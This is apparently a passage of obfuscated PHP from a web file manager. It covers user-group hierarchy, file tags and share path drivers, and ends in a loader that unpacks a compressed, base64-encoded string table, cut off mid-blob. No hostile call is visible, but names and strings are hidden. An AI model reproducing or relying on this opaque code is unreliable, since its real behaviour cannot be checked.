($ù¶Ê±‡İ = 0; $ù¶Ê±‡İ < count($“×®­¼); $ù¶Ê±‡İ++) { if ($õ¸†ğÛ° == $ù¶Ê±‡İ) { continue; } if ($this->isParentOf($“×®­¼[$ù¶Ê±‡İ], $“×®­¼[$õ¸†ğÛ°])) { $îÇ°Áõ¥ = !0; break; } } if (!$îÇ°Áõ¥) { $éÀÅ÷™û[] = $“×®­¼[$õ¸†ğÛ°]; } } return $éÀÅ÷™û; } protected function isParentOf($àİŞÛ¯µ, $£¢î¢¢à) { $š‹Óçİî =& $_SERVER[«òÑğ]; if (!$àİŞÛ¯µ || !$£¢î¢¢à || $àİŞÛ¯µ == $£¢î¢¢à) { return !1; } $ÄäÒÀ–ó = $this->getInfoSimple($àİŞÛ¯µ); $ş¼ğÜÄ¦ = $this->getInfoSimple($£¢î¢¢à); $Â¦Õ = $ÄäÒÀ–ó[$š‹Óçİî[589]] . $àİŞÛ¯µ . $š‹Óçİî[50]; if (substr($ş¼ğÜÄ¦[$š‹Óçİî[589]], 0, strlen($Â¦Õ)) == $Â¦Õ) { return !0; } return !1; } public function groupShowRoot($Ë‡Å¡œğ, $×ÜÀÙœî = false) { $¿öÚÍ› =& $_SERVER[«òÑğ]; $Á³€ = $this->getInfo($Ë‡Å¡œğ); if (!$Á³€) { return array(); } $Èà‹‡¤ = $this->parentLevelArray($Á³€[$¿öÚÍ›[589]]); $ËÊèŠïç = array($Ë‡Å¡œğ); if (count($Èà‹‡¤) == 0) { return $ËÊèŠïç; } if ($×ÜÀÙœî && count($Èà‹‡¤) == 1) { return $ËÊèŠïç; } if (!$Á³€[$¿öÚÍ›[544]] || !isset($Á³€[$¿öÚÍ›[544]][$¿öÚÍ›[2075]]) || $Á³€[$¿öÚÍ›[544]][$¿öÚÍ›[2075]] == $¿öÚÍ›[860]) { return $this->groupShowRoot($Èà‹‡¤[count($Èà‹‡¤) - 1], $×ÜÀÙœî); } if ($Á³€[$¿öÚÍ›[544]][$¿öÚÍ›[2075]] == $¿öÚÍ›[435]) { $¥¼ï¾èÜ = explode($¿öÚÍ›[50], $Á³€[$¿öÚÍ›[544]][$¿öÚÍ›[2076]]); if ($¥¼ï¾èÜ) { $ËÊèŠïç = array_merge($ËÊèŠïç, $¥¼ï¾èÜ); } } return $ËÊèŠïç; } protected function resetParentLevel() { $«¬†è =& $_SERVER[«òÑğ]; $ï’µÈı = $«¬†è[1985]; $æ¥ãÄĞ™ = $this->select(); $æ¥ãÄĞ™ = array_to_keyvalue($æ¥ãÄĞ™, $ï’µÈı); foreach ($æ¥ãÄĞ™ as $¹½û¹ÙÔ) { $ˆ‘³‹…˜ = $¹½û¹ÙÔ; $…ŠíçêØ = array(); while ($ˆ‘³‹…˜[$«¬†è[193]] != 0) { $…ŠíçêØ[] = $ˆ‘³‹…˜[$«¬†è[193]]; $ˆ‘³‹…˜ = $æ¥ãÄĞ™[$ˆ‘³‹…˜[$«¬†è[193]]]; } $…ŠíçêØ[] = 0; $…ŠíçêØ = $«¬†è[50] . implode($«¬†è[50], array_reverse($…ŠíçêØ)) . $«¬†è[50]; $this->setNamePinyin($¹½û¹ÙÔ[$ï’µÈı], $¹½û¹ÙÔ[$«¬†è[32]]); $this->where(array($ï’µÈı => $¹½û¹ÙÔ[$ï’µÈı]))->save(array($«¬†è[660] => $…ŠíçêØ)); } return $æ¥ãÄĞ™; } public function groupNameAuto($´äßßÖ³, $…Š¥Âå) { $¹È¿øÇ¡ =& $_SERVER[«òÑğ]; $™ƒ…èà = $this->where(array($¹È¿øÇ¡[480] => $´äßßÖ³))->getField($¹È¿øÇ¡[32], !0); if (!$™ƒ…èà || !in_array($…Š¥Âå, $™ƒ…èà)) { return $…Š¥Âå; } for ($åÏ§‘Ş¢ = 1; $åÏ§‘Ş¢ <= count($™ƒ…èà) + 1; $åÏ§‘Ş¢++) { $÷áã•Ş³ = $…Š¥Âå . "\x28{$åÏ§‘Ş¢}\x29"; if (!in_array($÷áã•Ş³, $™ƒ…èà)) { return $÷áã•Ş³; } } } public function groupSwitch($™£í±ïŒ, $£ı¶Úıª) { $ííæê¸è =& $_SERVER[«òÑğ]; $âÒåûÜ = array($ííæê¸è[1985] => array($ííæê¸è[7], array($™£í±ïŒ, $£ı¶Úıª))); $ù…ğæ½ = $this->where($âÒåûÜ)->select(); $ù…ğæ½ = array_to_keyvalue($ù…ğæ½, $ííæê¸è[1985]); if (!isset($ù…ğæ½[$™£í±ïŒ]) || !isset($ù…ğæ½[$£ı¶Úıª]) || $ù…ğæ½[$™£í±ïŒ][$ííæê¸è[193]] == 0) { return !1; } $âÒåûÜ = array($ííæê¸è[1985] => $™£í±ïŒ); $´ÀÁ©ò = Model($ííæê¸è[2079])->where($âÒåûÜ)->select(); if (!$´ÀÁ©ò) { $´ÀÁ©ò = array(); } foreach ($´ÀÁ©ò as $ÎÑßà±å) { $ª©¬Ã = $ÎÑßà±å[$ííæê¸è[1784]]; $âÒåûÜ = array($ííæê¸è[1784] => $ª©¬Ã, $ííæê¸è[1985] => $£ı¶Úıª); $´ïûªİ› = Model($ííæê¸è[2079])->where($âÒåûÜ)->find(); if (!$´ïûªİ›) { $œáˆÉª¹ = array($£ı¶Úıª => $ÎÑßà±å[$ííæê¸è[2093]]); Model($ííæê¸è[602])->userGroupAdd($ª©¬Ã, $œáˆÉª¹); } Model($ííæê¸è[602])->userGroupRemove($ª©¬Ã, $™£í±ïŒ); } $âÒåûÜ = array($ííæê¸è[191] => 2, $ííæê¸è[193] => 0, $ííæê¸è[488] => 1, $ííæê¸è[574] => array($ííæê¸è[7], array($™£í±ïŒ, $£ı¶Úıª))); $”áñü¦¿ = Model($ííæê¸è[914])->where($âÒåûÜ)->field($ííæê¸è[2094])->select(); $”áñü¦¿ = array_to_keyvalue($”áñü¦¿, $ííæê¸è[574], $ííæê¸è[194]); $…Ùê¡ÌŞ = !empty($”áñü¦¿[$™£í±ïŒ]) ? $”áñü¦¿[$™£í±ïŒ] : !1; if ($…Ùê¡ÌŞ) { if (!$”áñü¦¿[$£ı¶Úıª]) { $”áñü¦¿[$£ı¶Úıª] = Model($ííæê¸è[914])->groupRootAdd($£ı¶Úıª); } $»ù­Ë—ş = $”áñü¦¿[$£ı¶Úıª]; $âÒåûÜ = array($ííæê¸è[193] => $…Ùê¡ÌŞ); $”áñü¦¿ = Model($ííæê¸è[914])->where($âÒåûÜ)->field($ííæê¸è[2095])->select(); if (!$”áñü¦¿) { $”áñü¦¿ = array(); } Model($ííæê¸è[914])->moveClearAuth = !1; foreach ($”áñü¦¿ as $¤ÆâÇÌ) { $‚õİ‘Ü‘ = $¤ÆâÇÌ[$ííæê¸è[488]] == $ííæê¸è[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ííæê¸è[914])->move($¤ÆâÇÌ[$ííæê¸è[194]], $»ù­Ë—ş, $‚õİ‘Ü‘); } Model($ííæê¸è[914])->moveClearAuth = !0; $âÒåûÜ = array($ííæê¸è[191] => 2, $ííæê¸è[574] => $™£í±ïŒ); $ÎÎÊ´Ï = array($ííæê¸è[574] => $£ı¶Úıª); Model($ííæê¸è[2096])->where($âÒåûÜ)->save($ÎÎÊ´Ï); Model($ííæê¸è[2097])->where($âÒåûÜ)->save($ÎÎÊ´Ï); } $this->_changeChildLevel($ù…ğæ½[$™£í±ïŒ], $ù…ğæ½[$£ı¶Úıª], !0); $this->where(array($ííæê¸è[193] => $™£í±ïŒ))->save(array($ííæê¸è[193] => $£ı¶Úıª)); $this->_clearChildrenCache($ù…ğæ½[$£ı¶Úıª]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\146\141\166"; protected function cacheFunctionAlias($â†Ëá¾ø) { $ò¥ÙŒ· =& $_SERVER[«òÑğ]; return array($ò¥ÙŒ·[2098] => array($â†Ëá¾ø[0], $ò¥ÙŒ·[2099]), $ò¥ÙŒ·[2100] => array($â†Ëá¾ø[0], $ò¥ÙŒ·[2101])); } protected function get($‹£›Ù) { $ƒ¦ºÓ™š =& $_SERVER[«òÑğ]; $÷ö®œÁû = Model($ƒ¦ºÓ™š[590])->metaGet($‹£›Ù, $ƒ¦ºÓ™š[2102]); $¤»€âÂ = json_decode($÷ö®œÁû, !0); return $¤»€âÂ ? $¤»€âÂ : array($ƒ¦ºÓ™š[2103] => $ƒ¦ºÓ™š[91], $ƒ¦ºÓ™š[448] => array()); } protected function set($Ø–ğò¹ª, $ş­È¯¸û) { $©»üø¸æ =& $_SERVER[«òÑğ]; $ş­È¯¸û = $ş­È¯¸û ? $ş­È¯¸û : array($©»üø¸æ[2103] => $©»üø¸æ[91], $©»üø¸æ[448] => array()); return Model($©»üø¸æ[590])->metaSet($Ø–ğò¹ª, $©»üø¸æ[2102], json_encode($ş­È¯¸û)); } protected function getByTagID($ƒ¨¢…à˜, $’à÷ûÚ) { $†ä¼ãêº =& $_SERVER[«òÑğ]; if (!$ƒ¨¢…à˜ || !$’à÷ûÚ) { return !1; } if (!Model($†ä¼ãêº[590])->getInfoSimple($ƒ¨¢…à˜)) { return !1; } $¸‡Óı‹Í = $this->get($ƒ¨¢…à˜); if (!$¸‡Óı‹Í || !isset($¸‡Óı‹Í[$†ä¼ãêº[448]])) { return !1; } $«·§óÂ = array_find_by_field($¸‡Óı‹Í[$†ä¼ãêº[448]], $†ä¼ãêº[478], $’à÷ûÚ); return is_array($«·§óÂ) ? $«·§óÂ : !1; } public function listSource($¦˜Ğ£ìê, $»©ŠéŠ) { $òÓ¨©Ş =& $_SERVER[«òÑğ]; if ($»©ŠéŠ && !is_array($»©ŠéŠ)) { $»©ŠéŠ = array($»©ŠéŠ); } $İ‘ŞÙĞç = $this->listData($¦˜Ğ£ìê); $àßØÎòŞ = array(); foreach ($İ‘ŞÙĞç as $ Ò‹ŒÚ) { $ñµÔÆ¿¥ = $ Ò‹ŒÚ[$òÓ¨©Ş[87]]; if (!$ñµÔÆ¿¥) { continue; } if (!isset($àßØÎòŞ[$ñµÔÆ¿¥])) { $àßØÎòŞ[$ñµÔÆ¿¥] = array(); } $àßØÎòŞ[$ñµÔÆ¿¥][] = $ Ò‹ŒÚ[$òÓ¨©Ş[503]]; } $ÂÄéœï = array(); foreach ($àßØÎòŞ as $ÃâŒïÄ˜ => $óÁ›­³) { $Æ€›°—û = !0; if (!$»©ŠéŠ) { $ÂÄéœï[] = $ÃâŒïÄ˜; continue; } foreach ($»©ŠéŠ as $ı¿‚Î·Š) { if (!in_array($ı¿‚Î·Š, $óÁ›­³)) { $Æ€›°—û = !1; break; } } if ($Æ€›°—û) { $ÂÄéœï[] = $ÃâŒïÄ˜; } } if (!$ÂÄéœï) { return array(); } $¤¬ ˜¼¹ = array($òÓ¨©Ş[494] => array($òÓ¨©Ş[495], $ÂÄéœï), $òÓ¨©Ş[574] => $¦˜Ğ£ìê, $òÓ¨©Ş[191] => SourceModel::TYPE_GROUP); $ÍïûŒ‚Ö = Model($òÓ¨©Ş[1431])->listSource($¤¬ ˜¼¹); if (!$ÍïûŒ‚Ö || count($ÂÄéœï) == $ÍïûŒ‚Ö[$òÓ¨©Ş[445]][$òÓ¨©Ş[446]]) { return $ÍïûŒ‚Ö; } $½àÔ£Ëë = array(); $…ï’‹Ü = array_to_keyvalue($ÍïûŒ‚Ö[$òÓ¨©Ş[85]], $òÓ¨©Ş[12], $òÓ¨©Ş[194]); $ûàÛ„ùù = array_to_keyvalue($ÍïûŒ‚Ö[$òÓ¨©Ş[86]], $òÓ¨©Ş[12], $òÓ¨©Ş[194]); $ÜøúüÃ÷ = array_merge($ûàÛ„ùù, $…ï’‹Ü); foreach ($ÂÄéœï as $ñµÔÆ¿¥) { if (!in_array($ñµÔÆ¿¥, $ÜøúüÃ÷)) { $½àÔ£Ëë[] = $ñµÔÆ¿¥; } } if ($½àÔ£Ëë) { $this->removeBySource($¦˜Ğ£ìê, $½àÔ£Ëë); } return $ÍïûŒ‚Ö; } protected function listData($¬øğü¶) { $Ü´…Â„  =& $_SERVER[«òÑğ]; $äóëØÚ = array($Ü´…Â„ [1775] => 0, $Ü´…Â„ [562] => array($Ü´…Â„ [2104], 0), $Ü´…Â„ [499] => $Ü´…Â„ [2105] . $¬øğü¶); $ĞÖ´—úˆ = $Ü´…Â„ [2106]; $—’İÄ™¾ = $this->field($ĞÖ´—úˆ)->where($äóëØÚ)->order($Ü´…Â„ [2107])->select(); return $—’İÄ™¾ ? $—’İÄ™¾ : array(); } protected function addToTag($»ªÄ¤, $ŞŒñö’Ã, $àñåÆ§) { $»¦ïÅŠ =& $_SERVER[«òÑğ]; if (!$this->getByTagID($»ªÄ¤, $àñåÆ§) || !$ŞŒñö’Ã) { return !1; } if (!Model($»¦ïÅŠ[914])->pathInfo($ŞŒñö’Ã)) { return !1; } $´‹ıàö = array($»¦ïÅŠ[1775] => 0, $»¦ïÅŠ[562] => $àñåÆ§, $»¦ïÅŠ[498] => $ŞŒñö’Ã, $»¦ïÅŠ[499] => $»¦ïÅŠ[2108] . $»ªÄ¤, $»¦ïÅŠ[497] => $»¦ïÅŠ[12], $»¦ïÅŠ[1989] => 0); if ($this->where($´‹ıàö)->find()) { return !1; } return $this->add($´‹ıàö); } protected function removeFromTag($¼ÕúÀİç, $¦¬Áü¶, $§ÎÀÃ¶û) { $¸Š¯ŠšÕ =& $_SERVER[«òÑğ]; if (!$this->getByTagID($¼ÕúÀİç, $§ÎÀÃ¶û) || !$¦¬Áü¶) { return !1; } if (is_array($¦¬Áü¶)) { $¦¬Áü¶ = array($¸Š¯ŠšÕ[7], $¦¬Áü¶); } $şÜ°¢ = array($¸Š¯ŠšÕ[1775] => 0, $¸Š¯ŠšÕ[562] => $§ÎÀÃ¶û, $¸Š¯ŠšÕ[499] => $¸Š¯ŠšÕ[2108] . $¼ÕúÀİç, $¸Š¯ŠšÕ[498] => $¦¬Áü¶); return $this->where($şÜ°¢)->delete(); } protected function removeByTag($»ÙËÒÏ›, $ÍĞ•ï»Ì) { $ä¤È§“¢ =& $_SERVER[«òÑğ]; if (!$this->getByTagID($»ÙËÒÏ›, $ÍĞ•ï»Ì)) { return !1; } $­Ø°»Ò¿ = array($ä¤È§“¢[1775] => 0, $ä¤È§“¢[562] => $ÍĞ•ï»Ì, $ä¤È§“¢[499] => $ä¤È§“¢[2108] . $»ÙËÒÏ›); return $this->where($­Ø°»Ò¿)->delete(); } protected function removeBySource($Œ•š”æı, $Ù²´™µş) { $ÃÍºîê­ =& $_SERVER[«òÑğ]; if (!$Œ•š”æı || !$Ù²´™µş) { return !1; } if (is_array($Ù²´™µş)) { $Ù²´™µş = array($ÃÍºîê­[7], $Ù²´™µş); } $º¹¤½‚Ï = array($ÃÍºîê­[1775] => 0, $ÃÍºîê­[498] => $Ù²´™µş, $ÃÍºîê­[562] => array($ÃÍºîê­[1101], 0), $ÃÍºîê­[499] => $ÃÍºîê­[2108] . $Œ•š”æı); return $this->where($º¹¤½‚Ï)->delete(); } } goto c”•†Œ´Ò; FèˆéÄ¼¦Á: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ıİëÒê‡) { $this->pathParse = $ıİëÒê‡; $this->model = Model($_SERVER[«òÑğ][1431]); } public function getPathOuter($¤¹âåœ) { $Æ¸â™ë =& $_SERVER[«òÑğ]; if (!$¤¹âåœ) { return $¤¹âåœ; } $¸Æú¥èş = $this->parse($¤¹âåœ); return trim(KodIO::makeShare($this->pathParse[$Æ¸â™ë[478]], $¸Æú¥èş[$Æ¸â™ë[478]]), $Æ¸â™ë[8]); } protected function infoParse($ù³ø…ø´, $‰¹âíÄ = false, $â‡òÅ›¦ = false) { $­Ä¼œÃŒ =& $_SERVER[«òÑğ]; $”Ô³¼ˆ = $this->pathParse[$­Ä¼œÃŒ[478]]; $”Ô­› = trim($this->pathParse[$­Ä¼œÃŒ[1260]], $­Ä¼œÃŒ[8]); return Action($­Ä¼œÃŒ[1438])->sharePathInfo($”Ô³¼ˆ, $”Ô­›, $‰¹âíÄ); } public function infoFull($£“²ç²à) { $ÀÈ¦„¨ì =& $_SERVER[«òÑğ]; $•ÓŸÜ‚ = explode($ÀÈ¦„¨ì[8], trim($£“²ç²à, $ÀÈ¦„¨ì[8])); if (count($•ÓŸÜ‚) > 1) { $ûü¯ı±¾ = implode($ÀÈ¦„¨ì[8], array_splice($•ÓŸÜ‚, 1)); $Îšé¶óÅ = $this->model->pathInfoByPath($•ÓŸÜ‚[0], $ûü¯ı±¾); if (!$Îšé¶óÅ) { return !1; } $this->pathParse[$ÀÈ¦„¨ì[1260]] = $Îšé¶óÅ[$ÀÈ¦„¨ì[194]]; } return $this->infoParse($£“²ç²à); } public function listAll($»…Ø…¡) { $øûŒú =& $_SERVER[«òÑğ]; $ûèàî¬ş = IO::info($this->pathParse[$øûŒú[87]]); if (!$ûèàî¬ş) { return array(); } $Ê¦¶¡‚å = $this->model->listAll($»…Ø…¡); $¯¿Ôöé® = Model($øûŒú[672])->getInfo($ûèàî¬ş[$øûŒú[673]]); foreach ($Ê¦¶¡‚å as &$×õÙİØ) { check_abort(); $×õÙİØ[$øûŒú[90]] = Action($øûŒú[1438])->_shareItemeParse($×õÙİØ[$øûŒú[90]], $¯¿Ôöé®); } unset($×õÙİØ); return $Ê¦¶¡‚å; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($†ßÑÚ¬) { $this->pathParse = $†ßÑÚ¬; $this->model = Model($_SERVER[«òÑğ][1431]); } protected function infoParse($é”‹â„, $†·šÎœü = false, $Ô¶è»‹Í = false) { $†Œ§ªğ =& $_SERVER[«òÑğ]; return Action($†Œ§ªğ[1266])->sharePathInfo($this->pathParse[$†Œ§ªğ[87]], !0, $†·šÎœü); } public function listPath($–úã¤ŸË, $æÔ¦æÃ· = false) { $ºá¶Â·Ñ =& $_SERVER[«òÑğ]; $ğ•ÔÛêù = parent::listPath($–úã¤ŸË, $æÔ¦æÃ·); if (!$ğ•ÔÛêù) { return $ğ•ÔÛêù; } if (is_array($ğ•ÔÛêù[$ºá¶Â·Ñ[1439]])) { $ğ•ÔÛêù[$ºá¶Â·Ñ[1439]] = Action($ºá¶Â·Ñ[1266])->shareItemInfo($ğ•ÔÛêù[$ºá¶Â·Ñ[1439]]); } foreach ($ğ•ÔÛêù as $ş™½Ûõ => $õ±ïŒßİ) { if (!in_array($ş™½Ûõ, array($ºá¶Â·Ñ[86], $ºá¶Â·Ñ[85]))) { continue; } foreach ($õ±ïŒßİ as $¨š…¬¹ˆ => $ª«»¸¦Œ) { $ğ•ÔÛêù[$ş™½Ûõ][$¨š…¬¹ˆ] = Action($ºá¶Â·Ñ[1266])->shareItemInfo($ª«»¸¦Œ); } } return $ğ•ÔÛêù; } public function listAll($Ó—ÔãØ€) { $†§É¶ ó =& $_SERVER[«òÑğ]; $ùÇ›„Åª = IO::info($this->pathParse[$†§É¶ ó[87]]); if (!$ùÇ›„Åª) { return array(); } $¶‘Å…£ú = $this->model->listAll($Ó—ÔãØ€); foreach ($¶‘Å…£ú as &$Ñìç¸Ç¬) { $Ñìç¸Ç¬[$†§É¶ ó[90]] = Action($†§É¶ ó[1266])->shareItemInfo($Ñìç¸Ç¬[$†§É¶ ó[90]]); } unset($Ñìç¸Ç¬); return $¶‘Å…£ú; } } class PathDriverDriverShareItem { public function __construct($Ô•‡ìÇ) { $this->pathParse = $Ô•‡ìÇ; } public function __call($÷èÔÙ«–, $¦ã«÷­û) { $î‘£’ı¦ =& $_SERVER[«òÑğ]; if (method_exists($this, $÷èÔÙ«–)) { return; } $™ÔÇÉ¼Í = call_user_func_array(array($î‘£’ı¦[1440], $÷èÔÙ«–), $¦ã«÷­û); $…÷¿”ÓÔ = array($î‘£’ı¦[1441], $î‘£’ı¦[1442], $î‘£’ı¦[1443], $î‘£’ı¦[1444], $î‘£’ı¦[626], $î‘£’ı¦[628], $î‘£’ı¦[1445], $î‘£’ı¦[110], $î‘£’ı¦[1446], $î‘£’ı¦[1447]); if (in_array($÷èÔÙ«–, $…÷¿”ÓÔ)) { $™ÔÇÉ¼Í = $this->getPathOuter($™ÔÇÉ¼Í); } return $™ÔÇÉ¼Í; } public function copy($Â×š†Á£, $ˆ™¸ó×, $ÃİÖëãã = false, $Å¾ı¦ô = false) { return $this->copyMove($Â×š†Á£, $ˆ™¸ó×, $ÃİÖëãã, $_SERVER[«òÑğ][626], $Å¾ı¦ô); } public function move($ÇùÉûùÂ, $Ê×àÅØì, $¤ÍŸ’¨Ê = false, $Ê‰»àìş = false) { return $this->copyMove($ÇùÉûùÂ, $Ê×àÅØì, $¤ÍŸ’¨Ê, $_SERVER[«òÑğ][628], $Ê‰»àìş); } private function copyMove($Úïú¦õ¡, $ßœ—ø®…, $Î¶œ…âĞ, $„Ü¾‚äñ, $¨ì´ê·Ò = false) { $†ŞŞæ =& $_SERVER[«òÑğ]; $²›¾ˆı• = $ßœ—ø®…; $¦¡¶„– = IO::driverMake($ßœ—ø®…); if ($¦¡¶„–->pathParse[$†ŞŞæ[1242]]) { $ßœ—ø®… = $¦¡¶„–->pathParse[$†ŞŞæ[1242]]; } else { $ßœ—ø®… = $²›¾ˆı•; } $•ÇÓé = IO::copyMove($Úïú¦õ¡, $ßœ—ø®…, $Î¶œ…âĞ, $„Ü¾‚äñ, $¨ì´ê·Ò); $•ÇÓé = $this->getPathOuter($•ÇÓé); return $•ÇÓé; } public function pathThis($Ş¿°‰«§) { return get_path_this($this->pathParse[$_SERVER[«òÑğ][87]]); } public function pathFather($Ÿ”¹¿›ä) { return get_path_father($this->pathParse[$_SERVER[«òÑğ][87]]); } public function iconvSystem($³áÒ•â) { return $³áÒ•â; } protected function infoParse($Á´±™Íß, $Û×éõ±‡ = false) { $ã‰™Ôİ =& $_SERVER[«òÑğ]; $§áŞ¡© = $this->pathParse[$ã‰™Ôİ[565]][$ã‰™Ôİ[1267]] . $this->pathParse[$ã‰™Ôİ[1260]]; if ($Û×éõ±‡) { $Á‰éû×í = IO::infoWithChildren($§áŞ¡©); } else { $Á‰éû×í = IO::info($§áŞ¡©); } $¾œË·£® = $this->pathParse[$ã‰™Ôİ[565]]; return Action($ã‰™Ôİ[1438])->_shareItemeParse($Á‰éû×í, $¾œË·£®); } public function listAll($Òø¼âÛ©) { $ÆäŞ…æö =& $_SERVER[«òÑğ]; $“Ò½›¡ì = IO::listAll($Òø¼âÛ©); $É©­öğ = rtrim($this->pathParse[$ÆäŞ…æö[565]][$ÆäŞ…æö[1267]], $ÆäŞ…æö[8]); foreach ($“Ò½›¡ì as &$ÑœÓĞ¿) { $ÑœÓĞ¿[$ÆäŞ…æö[87]] = $this->pathDriver . $ÆäŞ…æö[8] . ltrim(substr($ÑœÓĞ¿[$ÆäŞ…æö[87]], strlen($É©­öğ)), $ÆäŞ…æö[8]); } unset($ÑœÓĞ¿); return $“Ò½›¡ì; } public function listAllSimple($Ÿ±©ß¦, $Şöªê¿× = false) { $Œ˜ª¡öË =& $_SERVER[«òÑğ]; $¸«š¹¥ = $this->listAll($Ÿ±©ß¦); $’îÔ›ç = $this->pathParse[$Œ˜ª¡öË[498]]; if (trim($’îÔ›ç, $Œ˜ª¡öË[8]) == trim(get_path_father($’îÔ›ç), $Œ˜ª¡öË[8])) { $Şöªê¿× = !0; } return IO::init($Œ˜ª¡öË[12])->listAllSimpleMake($¸«š¹¥, $’îÔ›ç, $Şöªê¿×); } public function getPathOuter($¹ß¤™“š) { $£‡êëô— =& $_SERVER[«òÑğ]; $ÛÃÃ¬üù = KodIO::parse($¹ß¤™“š); if ($ÛÃÃ¬üù[$£‡êëô—[33]] == KodIO::KOD_SHARE_ITEM) { return $ÛÃÃ¬üù[$£‡êëô—[87]]; } $¬œŸ°‘ğ = KodIO::clear($¹ß¤™“š); $—âğåı = KodIO::clear($this->pathParse[$£‡êëô—[565]][$£‡êëô—[1267]]); $¶ë×¾Ä = substr($¬œŸ°‘ğ, strlen($—âğåı)); if (substr($¬œŸ°‘ğ, 0, strlen($—âğåı)) != $—âğåı) { return !1; } return $this->pathParse[$£‡êëô—[1261]] . $£‡êëô—[8] . ltrim($¶ë×¾Ä, $£‡êëô—[8]); } public function getType() { $´şŸºÅå =& $_SERVER[«òÑğ]; $ÆÊ½Ñû× = str_replace($´şŸºÅå[77], $´şŸºÅå[12], get_class($this)); return strtolower($ÆÊ½Ñû×); } public function isOsDriver($ƒ×÷ÄŸ÷) { return IO::isOsDriver($ƒ×÷ÄŸ÷); } public function info($ˆÑü±¾ı) { return $this->infoParse($ˆÑü±¾ı); } public function infoAuth($íƒÒ²Õ¯) { return $this->infoParse($íƒÒ²Õ¯); } public function infoWithChildren($ÊÚºÙš“) { return $this->infoParse($ÊÚºÙš“, !0); } public function infoFull($ô‚Ø»Ñº) { return $this->infoParse($ô‚Ø»Ñº); } } goto e¶¤Í¤èƒ; céÓ¯áÍ³‘: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\253\362\236\236\321\360", "\x87\x80\xdf\xa1\xbf\xe9"); $_SERVER[«òÑğ] = explode("\174\1\174\1\174\5", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8V9CXgb1bUwDaUQ4JWW0jY0XSaGYDvRYju7E8fItmyLyJYjyVmwnclYGls=')."\x13\x4b\x1a\x59\x33\xf2\x92\x85\x2d\x9\x7b\x48\x68\x3\x4\x8\xfb\xda\x16\x8\x85\x2\x29\x61\x69\xa1\x14\x78\x6c\xa5\x94\x2\xa5\xf0\x68\x89\x9d\x4\x68\x69\xba\xb0\x97\xfe\x77\x39\x77\x99\x91\xc\xfd\xbf\xf7"."\177\337\37\110\64\367\334\163\367\163\317\75\367\334\163\317\275\350\357\357\157\333\363\322\372\57\240\377\16\333\364\233\203\217\274\163\23\375\136\177\50\372\157\22\375\376\336\5\107\34\102\376\174"."\355\202\363\53\52\132\347\36\71\263\375\350\255\77\275\135\373\122\303\315\37\374\362\247\117\357\374\355\33\117\377\50\236\134\174\377\316\376\357\36\262\251\362\73\63\153\21\52\115\131\113\177\224"."\254\151\53\372\210\141\331\26\5\44\314\154\237\321\117\277\215\54\375\365\323\237\316\150\70\257\147\114\133\247\101\37\375\121\241\126\344\137\153\60\155\260\170\265\75\22\127\143\235\35\35\301\150"."\34\220\152\345\370\214\231\204\257\234\226\327\62\120\176\116\317\133\250\66\162\166\152\316\314\351\131\7\104\0\222\232\255\365\152\26\344\324\324\240\66\5\73\302\221\225\152\174\145\107\20\60\172"."\xd5\xc1\x82\x9e\x1f\xa5\x21\xf2\x19\xb3\xb5\xbc\x1d\x37\x32\x3a\xc7\x18\xce\xf3\x7a\x35\x4\x5b\x42\xed\x4a\x3c\x1a\x68\x8f\x5\x1a\xe3\xa1\x48\x3b\x5\x37\x46\xda\xda\x42\xf1\x62\x78\x34\x12\xe\x37\x4\x1a\x97".base64_decode('FMd0RAMtbQEF1S+tq0a2z6xQVtOY1Uol/Wg29HSSfmY1Vh17NAdfcf6FhilbSKdpoJ1/JfU=').base64_decode('Pq2Qht5qkgO5vJHRWKOX6KMcSj+0gm0a2QQNBEfsvCbgqK4JNNB6FrKKBcPBxriCK6g0RyM=')."\155\12\14\102\106\263\154\75\257\54\157\15\106\203\12\256\164\135\71\151\153\271\2\364\322\216\272\102\11\204\303\312\104\71\330\172\46\307\262\241\151\112\144\26\211\66\5\243\112\303\112\105\364".base64_decode('UMLMZMysD+WCRtKWqhqMRumHB8g7HMKDBoFIc3MsyEPQuKVhVJNZQJ+OULIvbatDWrrAyHQ=')."\200\376\226\303\17\374\232\26\220\356\240\221\65\12\100\246\220\205\151\362\151\5\37\5\206\255\63\210\236\204\217\14\112\157\102\272\136\200\365\62\254\65\354\303\100\63\164\210\176\326\55\246\277"."\xb\x21\x7d\xaf\x8a\xe3\xf4\xbc\xad\xea\xd9\x84\x99\x34\xb2\x30\x8f\xeb\x81\x1e\x35\x3b\xd5\x94\x37\x10\x2\xd\xf7\x99\xe9\x24\xfb\xb6\x8c\xb5\xd0\xca\x3e\x23\xad\xb7\x17\x32\x32\xa\xf\x26\x52\x46\x3a\x99\x67"."\123\357\263\60\151\60\314\147\62\306\25\241\34\252\311\172\306\4\214\276\121\61\25\61\136\7\217\265\314\102\76\241\207\320\324\241\341\152\0\353\266\215\32\307\72\304\354\314\245\115\55\31\323"."\363\274\151\206\331\214\62\212\24\154\31\130\40\150\315\146\76\323\204\230\206\14\153\103\323\306\20\300\1\66\135\222\122\157\371\53\272\316\364\176\332\323\165\62\372\247\22\70\142\67\324\47\245"."\247\323\252\76\242\303\174\312\44\347\130\254\43\374\126\257\221\365\43\10\15\206\42\152\112\263\122\155\311\71\52\111\5\325\315\46\365\21\137\56\225\243\101\61\323\273\35\364\216\273\255\335\264"."\203\22\273\116\233\11\55\55\67\205\176\247\154\73\27\323\263\111\334\13\320\24\163\70\113\172\51\247\353\200\324\344\121\222\112\233\262\122\151\255\65\152\55\226\60\223\346\137\254\165\34\146\161"."\240\75\302\206\62\331\7\224\312\126\213\62\50\320\260\10\343\23\263\126\313\345\322\106\102\263\15\63\353\67\23\266\156\173\55\73\257\153\220\143\40\221\320\55\313\333\150\146\355\274\231\366\6"."\322\151\163\330\33\311\33\375\106\266\126\231\101\161\160\44\232\353\136\314\27\153\141\2\227\55\124\60\321\340\142\146\324\25\354\76\357\174\66\61\71\166\136\313\132\175\172\336\33\204\131\121\253"."\240\312\162\346\310\320\232\14\53\147\132\6\256\136\255\242\331\266\226\110\141\306\42\262\257\373\14\174\43